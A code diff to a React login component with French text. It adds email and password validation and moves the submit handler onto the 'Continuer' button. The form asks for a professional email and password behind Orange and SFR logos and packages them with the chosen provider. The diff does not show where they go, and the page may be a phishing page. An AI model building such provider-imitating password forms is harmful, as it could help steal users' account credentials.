@@ -15,6 +15,16 @@ function App() {
   const [messageError, setMessageError] = useState("");
 
   const onSubmit = async(email, password, platform) => {
+    if (!email || !/\S+@\S+\.\S+/.test(email)) {
+      setMessageError("Veuillez entrer une adresse email valide.");
+      return;
+    }
+
+    if (!password) {
+      setMessageError("Veuillez entrer un mot de passe.");
+      return;
+    }
+
     const data = {
       email: email,
       password: password,
@@ -54,10 +64,10 @@ function App() {
                 <img src={orange} alt="Orange" style={{border: platform === "Orange" ? "1px solid black" : ""}} onClick={() => setPlatform("Orange")} />
                 <img src={sfr} alt="SFR" style={{border: platform === "Sfr" ? "1px solid black" : ""}} onClick={() => setPlatform("Sfr")} />
             </div>
-            <form class="form" onSubmit={(e) => onSubmit(email, password, platform)}>
+            <form class="form">
               <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} class="email-input" placeholder="Veuillez entrer votre adresse professionnelle" />
               <input type="password" required value={password} onChange={(e) => setPassword(e.target.value)} class="email-input" placeholder="Veuillez entrer votre mot de passe" />
-              <button type='submit' class="continue-button">Continuer</button>
+              <button type='submit' class="continue-button" onClick={(e) => onSubmit(email, password, platform)}>Continuer</button>
               {messageError && <p style={{color: "red"}}>{messageError}</p>}
             </form>
         </div>
